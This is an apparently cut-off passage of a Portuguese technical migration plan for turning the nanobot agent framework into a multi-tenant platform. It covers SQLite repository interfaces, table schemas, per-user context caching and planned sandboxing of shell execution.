# nanobot Multi-Tenant: Documento Tecnico de Migracao

> **Versao**: 3.3 — 2026-02-24
> **Base analisada**: nanobot-ai v0.1.4.post1 (~10.334 linhas, 56 arquivos Python)
> **Banco de dados**: SQLite (via aiosqlite) com Repository Pattern para futura migracao a MongoDB
> **Objetivo**: Transformar o nanobot de single-user em plataforma multi-tenant
>
> **Status atual**: Fase 1 em andamento — 6 de 7 sub-fases concluidas. Proximo: **1.7 Migracao de dados existentes**.

---

## Resumo do Progresso

| Fase | Status | Testes |
|------|--------|--------|
| **1.1** Database Layer + Repository Pattern | ✅ Concluido | 28 |
| **1.2** Session + Memory + Skills Repos | ✅ Concluido | 36 |
| **1.3** Adaptar SessionManager + MemoryStore + SkillsLoader | ✅ Concluido | 34 |
| **1.4** Adaptar ContextBuilder + InboundMessage | ✅ Concluido | 33 |
| **1.5** Adaptar AgentLoop + UserContext | ✅ Concluido | 29 |
| **1.6** Adaptar CronService + Gateway Wiring | ✅ Concluido | 19 |
| **1.7** Migracao de dados existentes | ⏳ **Proximo** | — |
| **Fase 2** API HTTP | ⬚ Pendente | — |
| **Fase 3** Sandbox Docker | ⬚ Pendente | — |
| **Fase 4** Channels Multi-Tenant + Polish | ⬚ Pendente | — |

**Total de testes**: 257 passando | **Infraestrutura**: Docker Desktop com noVNC operacional

### Changelog

| Data | O que foi feito |
|------|-----------------|
| 2026-02-24 | **1.6+** Gateway wiring (`--multiuser`), CLI user commands (create/bind/list/unbind), teste E2E multi-user (8 testes). 257 testes. |
| 2026-02-24 | **1.6** CronService dual-mode (fs + db), CronTool async + user_id, CLI cron commands async, HeartbeatService test fix. 249 testes. |
| 2026-02-24 | **1.5** UserContext, build_user_context(), build_tool_registry(), RateLimiter, AgentLoop multi-user reescrito. 236 testes. |
| 2026-02-24 | **Docker Desktop** criado: Debian + XFCE + noVNC (browser) + nanobot instalado. `docker-compose.desktop.yml` |
| 2026-02-24 | **1.4** ContextBuilder dual-mode, InboundMessage.user_id, ServerConfig. 207 testes. |
| 2026-02-23 | **1.3** SessionManager/MemoryStore/SkillsLoader dual-mode (fs + db), async. 145 testes. |
| 2026-02-23 | **1.2** SQLite repos: session, message, memory (FTS5), skill, cron. Isolamento entre users. |
| 2026-02-22 | **1.1** Protocols, migrations (7 tabelas), SQLiteUserRepository, RepositoryFactory. |

### Arquivos-chave criados/modificados

```
nanobot/db/                          # NOVO — todo o layer de persistencia
  repositories.py                    # 8 Protocol interfaces
  factory.py                         # RepositoryFactory + create_sqlite_factory()
  sqlite/
    migrations.py                    # DDL: users, sessions, messages, memories, skills, cron_jobs, channel_bindings
    user_repo.py, session_repo.py, memory_repo.py, skill_repo.py, cron_repo.py, channel_binding_repo.py

nanobot/agent/
  user_context.py                    # NOVO — UserContext, build_user_context(), RateLimiter
  loop.py                            # REESCRITO — multi-user: resolve user, cache UserContext, rate limit
  context.py                         # REESCRITO — dual-mode (fs + db), async bootstrap
  memory.py                          # MODIFICADO — dual-mode (fs + db)
  skills.py                          # MODIFICADO — dual-mode (fs + db)

nanobot/session/manager.py           # MODIFICADO — dual-mode (fs + db)
nanobot/bus/events.py                # MODIFICADO — user_id field
nanobot/config/schema.py             # MODIFICADO — ServerConfig dataclass

nanobot/cron/
  types.py                           # MODIFICADO — CronJob.user_id field
  service.py                         # REESCRITO — dual-mode (fs + db), todos metodos async, user_id em todas APIs

nanobot/agent/tools/cron.py          # MODIFICADO — metodos async, set_context(user_id), passa user_id ao CronService
nanobot/cli/commands.py              # MODIFICADO — gateway --multiuser, CLI user commands, cron async

docker/desktop/                      # NOVO — Docker Desktop com noVNC
  Dockerfile, start.sh, supervisord.conf, config.json, xstartup
docker-compose.desktop.yml           # NOVO

tests/
  db/                                # 64 testes de repositorios
  agent/
    test_context_builder.py          # 20 testes
    test_user_context.py             # 17 testes
    test_agent_loop_multiuser.py     # 12 testes
    test_session_manager.py          # 11 testes
    test_memory_store.py             # 9 testes
    test_skills_loader.py            # 14 testes
  test_events.py                     # 8 testes
  test_server_config.py              # 5 testes
  test_heartbeat_service.py          # 2 testes (reescrito)
  db/
    test_cron_service_db.py          # 11 testes (CronService DB mode)
    test_multiuser_e2e.py            # 8 testes (isolamento E2E: sessions, cron, memory, rate limit)
```

---

## Indice

1. [Analise da Arquitetura Atual](#1-analise-da-arquitetura-atual)
2. [Arquitetura Multi-Tenant Alvo](#2-arquitetura-multi-tenant-alvo)
3. [Estrategia de Persistencia: Repository Pattern](#3-estrategia-de-persistencia-repository-pattern)
4. [Modelo de Dados](#4-modelo-de-dados)
5. [Mudancas por Componente](#5-mudancas-por-componente)
6. [API HTTP](#6-api-http)
7. [Isolamento de Execucao (Sandbox)](#7-isolamento-de-execucao-sandbox)
8. [Seguranca](#8-seguranca)
9. [Plano de Fases com Testes](#9-plano-de-fases-com-testes)
10. [Riscos e Decisoes](#10-riscos-e-decisoes)

---

## 1. Analise da Arquitetura Atual

### 1.1 Estrutura do Projeto

```
nanobot/
  agent/           # 2.499 linhas — loop, context, memory, skills, subagent, tools
  bus/             # 88 linhas — MessageBus + InboundMessage/OutboundMessage
  channels/        # 3.974 linhas — 11 channels (Telegram, Discord, Slack, etc.)
  cli/             # 1.125 linhas — CLI Typer (agent, gateway, cron, onboard)
  config/          # 442 linhas — Pydantic schema + loader JSON
  cron/            # 432 linhas — CronService + tipos
  heartbeat/       # 178 linhas — HeartbeatService (HEARTBEAT.md)
  providers/       # 1.280 linhas — LLM providers (14+ via litellm)
  session/         # 217 linhas — SessionManager JSONL
  skills/          # Skills builtin (markdown)
  templates/       # Bootstrap templates
  utils/           # 85 linhas — helpers
```

### 1.2 Fluxo de Dados Atual

```
Channels (Telegram, Slack, Discord, ...)
    |
    v
BaseChannel._handle_message()     <-- is_allowed(sender_id) via allowFrom
    |
    v
MessageBus.inbound (asyncio.Queue) <-- fila unica
    |
    v
AgentLoop.run()                   <-- loop serial, 1 msg por vez
    |-- SessionManager             <-- sessions em .jsonl no filesystem
    |-- ContextBuilder             <-- monta system prompt
    |   |-- MemoryStore            <-- MEMORY.md + HISTORY.md (GLOBAL)
    |   +-- SkillsLoader           <-- skills/ no workspace (GLOBAL)
    |-- ToolRegistry               <-- tools registrados (ExecTool, Filesystem, Web, etc.)
    |   +-- ExecTool               <-- shell direto no host, deny patterns frageis
    +-- SubagentManager            <-- subagentes herdam tudo do parent
    |
    v
MessageBus.outbound --> ChannelManager --> envia resposta
```

### 1.3 Armazenamento Atual (Filesystem)

```
~/.nanobot/
  config.json                    <-- GLOBAL: 1 config para tudo
  workspace/
    sessions/*.jsonl             <-- por channel:chat_id, SEM user_id
    memory/MEMORY.md             <-- GLOBAL: 1 memoria para todos
    memory/HISTORY.md            <-- GLOBAL: 1 historico para todos
    skills/{name}/SKILL.md       <-- GLOBAL: compartilhado
    AGENTS.md, SOUL.md, ...      <-- GLOBAL: bootstrap files
    HEARTBEAT.md                 <-- GLOBAL: tarefas periodicas
    cron.json                    <-- GLOBAL: todos os cron jobs
  history/cli_history            <-- GLOBAL
```

### 1.4 Problemas para Multi-Tenant

| Componente | Arquivo | Problema |
|---|---|---|
| Config | `config/loader.py` | 1 arquivo global `~/.nanobot/config.json` |
| Memoria | `agent/memory.py` | 1 MEMORY.md e HISTORY.md para todos |
| Sessao | `session/manager.py` | Chave `channel:chat_id` sem `user_id` |
| Skills | `agent/skills.py` | Diretorio global `workspace/skills/` |
| Exec | `agent/tools/shell.py` | Shell direto no host, deny patterns contornaveis |
| Filesystem | `agent/tools/filesystem.py` | Guard de path fragil (`_resolve_path`) |
| AgentLoop | `agent/loop.py` | Loop serial unico, sem conceito de user |
| Cron | `cron/service.py` | 1 store global JSON (`cron.json`) |
| Heartbeat | `heartbeat/service.py` | 1 HEARTBEAT.md global |
| MessageBus | `bus/queue.py` | Fila unica sem user_id |
| Subagent | `agent/subagent.py` | Herda workspace/tools do parent |
| Bootstrap | `agent/context.py` | Lidos de workspace global (SOUL.md, AGENTS.md, etc.) |

### 1.5 O Que Funciona Bem e Deve Ser Preservado

- **Arquitetura modular** — cada componente e classe independente
- **ToolRegistry** — registro extensivel com schema OpenAI automatico
- **BaseChannel ABC** — interface abstrata desacoplada
- **MessageBus** — desacoplamento channel<->agent via fila async
- **LLM Provider** — stateless e async, pode ser compartilhado
- **Skills como Markdown** — formato simples, precisa apenas de particionamento
- **Consolidacao de memoria** — sumarizacao via LLM
- **Async-first** — toda I/O ja e non-blocking

### 1.6 Assinaturas Atuais dos Construtores (Referencia)

```python
# Os construtores que precisam mudar:
AgentLoop(bus, provider, workspace: Path, model, ..., session_manager, mcp_servers, ...)
SessionManager(workspace: Path)
MemoryStore(workspace: Path)
SkillsLoader(workspace: Path, builtin_skills_dir: Path | None)
ContextBuilder(workspace: Path)          # instancia MemoryStore e SkillsLoader internamente
SubagentManager(provider, workspace, bus, model, ...)
CronService(store_path: Path, on_job)
ExecTool(timeout, working_dir, deny_patterns, allow_patterns, restrict_to_workspace)
BaseChannel(config, bus)                 # sem user_id
InboundMessage(channel, sender_id, chat_id, content, ...)  # sem user_id
```

---

## 2. Arquitetura Multi-Tenant Alvo

### 2.1 Novo Fluxo de Dados

```
                    +---------------------------+
                    |     Agent Builder API      |
                    |    (FastAPI HTTP/SSE)      |
                    +-------------+-------------+
                                  | POST /api/v1/chat
                                  | Authorization: Bearer <jwt>
                                  v
                    +---------------------------+
                    |    Auth Layer (JWT/API Key)|
                    +-------------+-------------+
                                  |
         +------------------------+------------------------+
         |                        |                        |
         v                        v                        v
   Channels (existentes)    HTTP API (novo)          WebSocket (futuro)
         |                        |                        |
         +------------------------+------------------------+
                                  v
                    +---------------------------+
                    |      Tenant Router        |
                    | sender_id --> user_id      |
                    | (via channel_bindings)     |
                    +-------------+-------------+
                                  |
                                  v
   +--------------------------------------------------------------+
   |              AgentLoop (pool de workers)                       |
   |                                                                |
   |  UserContext (por user, lazy-loaded, cached):                  |
   |  +--------------+  +--------------+  +--------------+         |
   |  | SessionMgr   |  | MemoryStore  |  | SkillsLoader |         |
   |  | (Repository) |  | (Repository) |  | (Repository) |         |
   |  | +user_id     |  | +user_id     |  | +user_id     |         |
   |  +--------------+  +--------------+  +--------------+         |
   |                                                                |
   |  +----------------------------------------------------------+ |
   |  |            ToolRegistry (por user)                        | |
   |  | +----------+ +---------+ +-----------------------------+ | |
   |  | | WebTools | | MCP     | | SandboxedExec (fase 3)      | | |
   |  | | (shared) | | (config)| | ou ExecTool (fase 1, guard) | | |
   |  | +----------+ +---------+ +-----------------------------+ | |
   |  +----------------------------------------------------------+ |
   +-------------------------------+-------------------------------+
                                   |
                                   v
   +--------------------------------------------------------------+
   |  Repository Layer (interface abstrata)                        |
   |  +--SQLiteRepository (fase 1)                                 |
   |  +--MongoRepository (futuro)                                  |
   +--------------------------------------------------------------+
                                   |
                                   v
   +--------------------------------------------------------------+
   |  SQLite: ~/.nanobot/nanobot.db                                |
   |  (futuro: MongoDB nanobot_multitenant)                        |
   +--------------------------------------------------------------+
```

### 2.2 Principios de Design

1. **user_id e cidadao de primeira classe** — flui em TODA a stack
2. **Nada e compartilhado por default** — memoria, sessao, skills, cron sao POR USER
3. **Builtins sao read-only e globais** — skills builtin do pacote nao mudam por user
4. **Repository Pattern** — interface abstrata para storage; SQLite hoje, MongoDB amanha
5. **LLM Provider e compartilhado** — stateless, sem dados de user
6. **API keys de LLM sao do servidor** — a empresa fornece, nao o user individual
7. **Exec e sandboxed (fase 3)** — cada user tera container Docker isolado

### 2.3 Conceito Central: UserContext

```python
@dataclass
class UserContext:
    user_id: str
    user_doc: UserRecord           # config, limites, bootstrap
    session_manager: SessionManager
    memory_store: MemoryStore
    skills_loader: SkillsLoader
    context_builder: ContextBuilder
    tool_registry: ToolRegistry
    created_at: float              # timestamp para TTL
    last_used_at: float
```

Comportamento:
- Mensagem chega para `user_id` -> cache hit? -> reutilizar
- Cache miss -> buscar `user_doc` no banco -> construir componentes -> cachear
- Inativo por >30 min -> liberar do cache (proxima mensagem reconstroi)
- Lock por `user_id` para evitar race condition na construcao

---

## 3. Estrategia de Persistencia: Repository Pattern

### 3.1 Por Que Repository Pattern

O objetivo e **trocar o backend de SQLite para MongoDB sem mudar uma linha no AgentLoop, SessionManager, MemoryStore, etc.**

```
AgentLoop --> SessionManager --> SessionRepository (interface)
                                     |
                           +---------+---------+
                           |                   |
                    SQLiteSessionRepo     MongoSessionRepo
                    (fase 1)              (futuro)
```

### 3.2 Interfaces (Protocols)

```python
# nanobot/db/repositories.py

from typing import Protocol, Any

class UserRepository(Protocol):
    async def get_by_id(self, user_id: str) -> dict | None: ...
    async def get_by_api_key_hash(self, hash: str) -> dict | None: ...
    async def create(self, user_doc: dict) -> str: ...
    async def update(self, user_id: str, fields: dict) -> bool: ...
    async def list_all(self, status: str | None = None) -> list[dict]: ...
    async def increment_usage(self, user_id: str, tokens: int) -> None: ...

class SessionRepository(Protocol):
    async def get(self, user_id: str, session_key: str) -> dict | None: ...
    async def save(self, user_id: str, session_key: str, data: dict) -> None: ...
    async def list_sessions(self, user_id: str) -> list[dict]: ...
    async def delete(self, user_id: str, session_key: str) -> bool: ...

class MemoryRepository(Protocol):
    async def get_long_term(self, user_id: str) -> str: ...
    async def save_long_term(self, user_id: str, content: str) -> None: ...
    async def append_history(self, user_id: str, entry: str) -> None: ...
    async def get_history(self, user_id: str, limit: int = 100) -> list[str]: ...
    async def search_history(self, user_id: str, query: str) -> list[str]: ...

class SkillRepository(Protocol):
    async def list_skills(self, user_id: str) -> list[dict]: ...
    async def get_skill(self, user_id: str, name: str) -> dict | None: ...
    async def save_skill(self, user_id: str, skill: dict) -> None: ...
    async def delete_skill(self, user_id: str, name: str) -> bool: ...

class CronRepository(Protocol):
    async def list_jobs(self, user_id: str, include_disabled: bool = False) -> list[dict]: ...
    async def get_due_jobs(self) -> list[dict]: ...  # cross-user
    async def save_job(self, user_id: str, job: dict) -> None: ...
    async def delete_job(self, user_id: str, job_id: str) -> bool: ...
    async def update_job_state(self, job_id: str, state: dict) -> None: ...

class ChannelBindingRepository(Protocol):
    async def resolve_user(self, channel: str, sender_id: str) -> str | None: ...
    async def bind(self, user_id: str, channel: str, sender_id: str) -> None: ...
    async def unbind(self, user_id: str, channel: str, sender_id: str) -> bool: ...

class AuditRepository(Protocol):
    async def log(self, user_id: str, event: str, detail: dict) -> None: ...
    async def query(self, user_id: str | None, event: str | None, limit: int = 100) -> list[dict]: ...
```

### 3.3 Implementacao SQLite

Todas as interfaces acima serao implementadas em `nanobot/db/sqlite/` usando `aiosqlite`:

```
nanobot/db/
  __init__.py
  repositories.py          # Protocols (interfaces)
  sqlite/
    __init__.py
    connection.py           # Pool de conexoes aiosqlite
    migrations.py           # Schema DDL + migracao de versao
    user_repo.py
    session_repo.py
    memory_repo.py
    skill_repo.py
    cron_repo.py
    channel_binding_repo.py
    audit_repo.py
```

### 3.4 Futura Migracao para MongoDB

Quando decidir migrar:

1. Criar `nanobot/db/mongo/` com as mesmas interfaces
2. Implementar cada Repository usando `motor` (async MongoDB driver)
3. Mudar 1 linha no factory/wiring:
   ```python
   # De:
   repos = SQLiteRepositoryFactory(db_path)
   # Para:
   repos = MongoRepositoryFactory(mongo_uri, db_name)
   ```
4. Script de migracao: le do SQLite, escreve no MongoDB

**Nenhuma mudanca no AgentLoop, SessionManager, MemoryStore, etc.**

### 3.5 Dependencia Unica Adicionada

| Pacote | Motivo |
|---|---|
| `aiosqlite>=0.20.0` | Driver async para SQLite (zero config, arquivo local) |

MongoDB so sera adicionado quando for necessario (motor, pymongo).

---

## 4. Modelo de Dados

### 4.1 Visao Geral das Tabelas

```sql
-- Arquivo: ~/.nanobot/nanobot.db

users              -- perfil, config do agente, limites, bootstrap
sessions           -- conversas por user_id + session_key
messages           -- mensagens separadas (evita document size limit futuro)
memories           -- long_term + history por user_id
skills             -- skills de user (builtins ficam no filesystem, read-only)
cron_jobs          -- jobs agendados por user_id
channel_bindings   -- mapeamento sender_id -> user_id
audit_log          -- trilha de auditoria
```

### 4.2 Tabela: users

```sql
CREATE TABLE users (
    user_id       TEXT PRIMARY KEY,           -- 'usr_abc123'
    display_name  TEXT NOT NULL,
    email         TEXT UNIQUE,
    api_key_hash  TEXT UNIQUE,                -- sha256, NUNCA plaintext
    role          TEXT NOT NULL DEFAULT 'user', -- 'user' | 'admin'

    -- Config do agente (JSON serializado)
    agent_config  TEXT NOT NULL DEFAULT '{}', -- {model, max_tokens, temperature, ...}
    bootstrap     TEXT NOT NULL DEFAULT '{}', -- {soul, user_info, tools_instructions, ...}
    limits        TEXT NOT NULL DEFAULT '{}', -- {max_sessions, max_tokens_per_day, ...}
    tools_enabled TEXT NOT NULL DEFAULT '[]', -- JSON array: ["exec","web_search",...]

    -- Contadores de uso
    tokens_today     INTEGER NOT NULL DEFAULT 0,
    tokens_total     INTEGER NOT NULL DEFAULT 0,
    requests_today   INTEGER NOT NULL DEFAULT 0,
    last_request_at  TEXT,                    -- ISO datetime
    usage_reset_date TEXT,                    -- data do ultimo reset (YYYY-MM-DD)

    status     TEXT NOT NULL DEFAULT 'active', -- 'active' | 'suspended' | 'disabled'
    created_at TEXT NOT NULL DEFAULT (datetime('now')),
    updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX idx_users_status ON users(status);
CREATE INDEX idx_users_api_key_hash ON users(api_key_hash);
```

**agent_config default:**
```json
{
  "model": "anthropic/claude-sonnet-4-20250514",
  "max_tokens": 8192,
  "temperature": 0.1,
  "max_tool_iterations": 40,
  "memory_window": 100
}
```

**bootstrap default:**
```json
{
  "soul": "",
  "user_info": "",
  "tools_instructions": "",
  "agents_instructions": "",
  "identity": "",
  "heartbeat": ""
}
```

**limits default:**
```json
{
  "max_sessions": 100,
  "max_memory_entries": 10000,
  "max_skills": 50,
  "max_cron_jobs": 20,
  "max_exec_timeout_s": 30,
  "max_tokens_per_day": 1000000,
  "max_requests_per_minute": 30,
  "sandbox_memory": "256m",
  "sandbox_cpu": "0.5"
}
```

### 4.3 Tabela: sessions

```sql
CREATE TABLE sessions (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id         TEXT NOT NULL REFERENCES users(user_id),
    session_key     TEXT NOT NULL,             -- 'telegram:12345' ou 'api:ses_abc'
    last_consolidated INTEGER NOT NULL DEFAULT 0,
    message_count   INTEGER NOT NULL DEFAULT 0,
    status          TEXT NOT NULL DEFAULT 'active', -- 'active' | 'archived'
    metadata        TEXT NOT NULL DEFAULT '{}',
    created_at      TEXT NOT NULL DEFAULT (datetime('now')),
    updated_at      TEXT NOT NULL DEFAULT (datetime('now')),

    UNIQUE(user_id, session_key)
);

CREATE INDEX idx_sessions_user_status ON sessions(user_id, status);
CREATE INDEX idx_sessions_user_updated ON sessions(user_id, updated_at DESC);
```

### 4.4 Tabela: messages

Separar mensagens da sessao evita problemas de documento grande (MongoDB 16MB limit) e facilita queries.

```sql
CREATE TABLE messages (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id  INTEGER NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    user_id     TEXT NOT NULL,                -- desnormalizado para queries
    role        TEXT NOT NULL,                -- 'user' | 'assistant' | 'system' | 'tool'
    content     TEXT,
    tool_calls  TEXT,                         -- JSON array
    tool_call_id TEXT,
    name        TEXT,                         -- tool name
    timestamp   TEXT NOT NULL DEFAULT (datetime('now')),
    seq         INTEGER NOT NULL              -- ordem dentro da sessao
);

CREATE INDEX idx_messages_session ON messages(session_id, seq);
CREATE INDEX idx_messages_user ON messages(user_id, session_id);
```

### 4.5 Tabela: memories

```sql
CREATE TABLE memories (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    TEXT NOT NULL REFERENCES users(user_id),
    type       TEXT NOT NULL,                 -- 'long_term' | 'history'
    content    TEXT NOT NULL,
    created_at TEXT NOT NULL DEFAULT (datetime('now')),
    updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX idx_memories_user_type ON memories(user_id, type);
CREATE INDEX idx_memories_user_type_updated ON memories(user_id, type, updated_at DESC);
```

**Nota**: Para `type='long_term'`, existe **1 registro por user** (UPSERT). Para `type='history'`, sao **N registros** (append-only).

Full-text search em SQLite via FTS5:
```sql
CREATE VIRTUAL TABLE memories_fts USING fts5(content, content=memories, content_rowid=id);
-- Triggers para manter FTS sincronizado
```

### 4.6 Tabela: skills

```sql
CREATE TABLE skills (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id      TEXT NOT NULL REFERENCES users(user_id),
    name         TEXT NOT NULL,
    content      TEXT NOT NULL,               -- conteudo completo do SKILL.md
    description  TEXT NOT NULL DEFAULT '',
    always_active INTEGER NOT NULL DEFAULT 0, -- boolean
    enabled      INTEGER NOT NULL DEFAULT 1,
    created_at   TEXT NOT NULL DEFAULT (datetime('now')),
    updated_at   TEXT NOT NULL DEFAULT (datetime('now')),

    UNIQUE(user_id, name)
);

CREATE INDEX idx_skills_user_enabled ON skills(user_id, enabled);
```

**Builtins**: Continuam no filesystem (`nanobot/skills/`), read-only. O SkillsLoader faz merge: user skills (banco) + builtins (filesystem).

### 4.7 Tabela: cron_jobs

```sql
CREATE TABLE cron_jobs (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id         TEXT NOT NULL REFERENCES users(user_id),
    job_id          TEXT NOT NULL,             -- UUID curto
    name            TEXT NOT NULL,
    enabled         INTEGER NOT NULL DEFAULT 1,
    schedule        TEXT NOT NULL,             -- JSON: {kind, at_ms, every_ms, expr, tz}
    payload         TEXT NOT NULL,             -- JSON: {kind, message, deliver, channel, to}
    next_run_at_ms  INTEGER,
    last_run_at_ms  INTEGER,
    last_status     TEXT,
    last_error      TEXT,
    delete_after_run INTEGER NOT NULL DEFAULT 0,
    created_at      TEXT NOT NULL DEFAULT (datetime('now')),
    updated_at      TEXT NOT NULL DEFAULT (datetime('now')),

    UNIQUE(user_id, job_id)
);

CREATE INDEX idx_cron_enabled_next ON cron_jobs(enabled, next_run_at_ms);
CREATE INDEX idx_cron_user ON cron_jobs(user_id, enabled);
```

### 4.8 Tabela: channel_bindings

```sql
CREATE TABLE channel_bindings (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    TEXT NOT NULL REFERENCES users(user_id),
    channel    TEXT NOT NULL,                 -- 'telegram', 'discord', etc.
    sender_id  TEXT NOT NULL,                 -- ID do user no channel
    verified   INTEGER NOT NULL DEFAULT 1,
    created_at TEXT NOT NULL DEFAULT (datetime('now')),

    UNIQUE(channel, sender_id)
);

CREATE INDEX idx_bindings_user ON channel_bindings(user_id);
```

### 4.9 Tabela: audit_log

```sql
CREATE TABLE audit_log (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    TEXT NOT NULL,
    event      TEXT NOT NULL,                 -- 'tool_exec', 'login', 'config_change', ...
    detail     TEXT NOT NULL DEFAULT '{}',    -- JSON
    ip_address TEXT,
    user_agent TEXT,
    timestamp  TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX idx_audit_user_ts ON audit_log(user_id, timestamp DESC);
CREATE INDEX idx_audit_event_ts ON audit_log(event, timestamp DESC);
```

Cleanup periodico: `DELETE FROM audit_log WHERE timestamp < datetime('now', '-90 days')`.

### 4.10 Relacionamentos

```
users (1) ------< sessions (N)           via user_id
sessions (1) ---< messages (N)           via session_id
users (1) ------< memories (N)           via user_id
users (1) ------< skills (N)             via user_id
users (1) ------< cron_jobs (N)          via user_id
users (1) ------< channel_bindings (N)   via user_id
users (1) ------< audit_log (N)          via user_id
```

**Regra de ouro**: TODA query (exceto users) DEVE incluir `user_id` no WHERE. Garante isolamento por design.

---

## 5. Mudancas por Componente

### 5.1 Padrao Geral de Mudanca

| Padrao Atual | Padrao Novo |
|---|---|
| Recebe `workspace: Path` | Recebe `repository` (interface) e `user_id: str` |
| Le/escreve no filesystem | Le/escreve via Repository |
| Sync I/O | Async I/O (aiosqlite) |
| 1 instancia global | 1 instancia por user (dentro do UserContext) |

### 5.2 InboundMessage (`bus/events.py`)

**Mudanca**: Adicionar campo `user_id: str | None = None`.

```python
@dataclass
class InboundMessage:
    channel: str
    sender_id: str
    chat_id: str
    content: str
    user_id: str | None = None    # NOVO — preenchido pelo channel ou API
    timestamp: datetime = field(default_factory=datetime.now)
    media: list[str] = field(default_factory=list)
    metadata: dict[str, Any] = field(default_factory=dict)
    session_key_override: str | None = None
```

**Esforco**: S (< 1 dia)

### 5.3 SessionManager (`session/manager.py`)

**Mudanca**: Reescrita para usar `SessionRepository`.

```python
class SessionManager:
    def __init__(self, repo: SessionRepository, msg_repo: MessageRepository, user_id: str):
        self.repo = repo
        self.msg_repo = msg_repo
        self.user_id = user_id
        self._cache: dict[str, Session] = {}

    async def get_or_create(self, key: str) -> Session: ...
    async def save(self, session: Session) -> None: ...
    async def list_sessions(self) -> list[dict]: ...
```

**Nota**: `Session` dataclass nao muda — continua com messages, last_consolidated, etc. A diferenca e que o storage e async.

**Esforco**: M (2-3 dias)

### 5.4 MemoryStore (`agent/memory.py`)

**Mudanca**: Reescrita para usar `MemoryRepository`.

```python
class MemoryStore:
    def __init__(self, repo: MemoryRepository, user_id: str):
        self.repo = repo
        self.user_id = user_id

    async def read_long_term(self) -> str:
        return await self.repo.get_long_term(self.user_id)

    async def write_long_term(self, content: str) -> None:
        await self.repo.save_long_term(self.user_id, content)

    async def append_history(self, entry: str) -> None:
        await self.repo.append_history(self.user_id, entry)

    async def get_memory_context(self) -> str:
        lt = await self.read_long_term()
        return f"## Long-term Memory\n{lt}" if lt else ""

    async def consolidate(self, session, provider, model, ...) -> bool:
        # Logica LLM identica, mas le/escreve via repository
        ...
```

**Esforco**: M (2-3 dias)

### 5.5 SkillsLoader (`agent/skills.py`)

**Mudanca**: Skills de user vem do `SkillRepository`. Builtins continuam no filesystem.

```python
class SkillsLoader:
    def __init__(self, repo: SkillRepository, user_id: str,
                 builtin_skills_dir: Path | None = None):
        self.repo = repo
        self.user_id = user_id
        self.builtin_skills = builtin_skills_dir or BUILTIN_SKILLS_DIR

    async def list_skills(self, filter_unavailable=True) -> list[dict]:
        # 1. User skills do banco
        user_skills = await self.repo.list_skills(self.user_id)
        # 2. Builtins do filesystem
        builtins = self._load_builtins()
        # 3. Merge com prioridade do user
        ...

    async def load_skill(self, name: str) -> str | None:
        # Tenta user skill primeiro, depois builtin
        skill = await self.repo.get_skill(self.user_id, name)
        if skill:
            return skill["content"]
        return self._load_builtin(name)
```

**Esforco**: M (2-3 dias)

### 5.6 ContextBuilder (`agent/context.py`)

**Mudanca**: Recebe `user_doc` com bootstrap files. `build_system_prompt` e `build_messages` tornam-se async.

```python
class ContextBuilder:
    def __init__(self, memory: MemoryStore, skills: SkillsLoader,
                 user_doc: dict, workspace: Path | None = None):
        self.memory = memory
        self.skills = skills
        self.user_doc = user_doc
        self.workspace = workspace  # para backward compat na fase de transicao

    async def build_system_prompt(self, skill_names=None) -> str:
        parts = []
        parts.append(self._get_identity())

        # Bootstrap do user_doc (substitui leitura de SOUL.md, AGENTS.md, etc.)
        bootstrap = self.user_doc.get("bootstrap", {})
        for key in ["soul", "agents_instructions", "user_info", "tools_instructions", "identity"]:
            if content := bootstrap.get(key):
                parts.append(f"## {key}\n\n{content}")

        # Memoria (async)
        memory = await self.memory.get_memory_context()
        if memory:
            parts.append(f"# Memory\n\n{memory}")

        # Skills (async)
        always_skills = await self.skills.get_always_skills()
        ...
```

**Esforco**: M (2-3 dias)

### 5.7 AgentLoop (`agent/loop.py`) — MUDANCA MAIS COMPLEXA

**Mudancas**:

1. **Recebe `RepositoryFactory` e `ServerConfig`** em vez de `workspace`
2. **Cache de `UserContext`** — dict em memoria, lazy-loaded por `user_id`
3. **Processamento paralelo** — `asyncio.Semaphore` (max N workers)
4. **Resolucao de user** — para cada mensagem, buscar/criar UserContext
5. **ToolRegistry por user** — montado com base na whitelist `tools_enabled`
6. **Rate limiting** — verificar antes de processar
7. **Usage tracking** — incrementar apos processar

```python
class AgentLoop:
    def __init__(
        self,
        bus: MessageBus,
        provider: LLMProvider,
        repos: RepositoryFactory,
        server_config: ServerConfig,
        max_concurrent: int = 20,
        ...
    ):
        self.bus = bus
        self.provider = provider
        self.repos = repos
        self.server_config = server_config
        self._user_contexts: dict[str, UserContext] = {}
        self._user_locks: dict[str, asyncio.Lock] = {}
        self._semaphore = asyncio.Semaphore(max_concurrent)

    async def run(self):
        while self._running:
            msg = await self.bus.consume_inbound()
            # Dispatch para worker com semaforo
            asyncio.create_task(self._handle_with_semaphore(msg))

    async def _handle_with_semaphore(self, msg):
        async with self._semaphore:
            user_ctx = await self._get_or_create_context(msg.user_id)
            await self._process_message(msg, user_ctx)

    async def _get_or_create_context(self, user_id: str) -> UserContext:
        if user_id in self._user_contexts:
            ctx = self._user_contexts[user_id]
            ctx.last_used_at = time.time()
            return ctx
        # Lock por user para evitar criacao duplicada
        lock = self._user_locks.setdefault(user_id, asyncio.Lock())
        async with lock:
            if user_id in self._user_contexts:
                return self._user_contexts[user_id]
            return await self._build_context(user_id)
```

**Esforco**: L (4-5 dias)

### 5.8 ExecTool (`agent/tools/shell.py`)

**Fase 1**: Manter ExecTool existente com `restrict_to_workspace=True` e user_id no audit log.

**Fase 3**: Substituir por `SandboxedExecTool` que delega ao container Docker do user.

**Esforco**: S (fase 1), L (fase 3)

### 5.9 Filesystem Tools (`agent/tools/filesystem.py`)

**Fase 1**: Manter com `allowed_dir` apontando para `/sandboxes/{user_id}/workspace`.

**Fase 3**: Executar dentro do container.

**Esforco**: S (fase 1), L (fase 3)

### 5.10 BaseChannel (`channels/base.py`)

**Mudanca**: Novo metodo `resolve_user(sender_id)` via `ChannelBindingRepository`.

```python
